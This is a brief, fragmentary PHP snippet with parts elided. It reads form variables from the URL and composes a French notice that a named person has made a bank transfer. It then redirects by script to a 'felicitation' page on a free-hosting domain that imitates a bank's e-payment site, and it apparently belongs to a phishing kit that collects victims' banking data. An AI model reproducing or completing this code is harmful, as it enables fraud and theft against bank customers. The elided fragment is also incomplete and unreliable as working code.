...
// Fetching variables of the form which travels in URL
    ...
    {
        $message = "Bonjour, une nouvelle procédure de virément a été effectué par $name :
...
//  To redirect form on a particular page
        echo("<script>location.href='https://sogexia-fr-epay.000webhostapp.com/felicitation.php'</script>");
    }
    else{
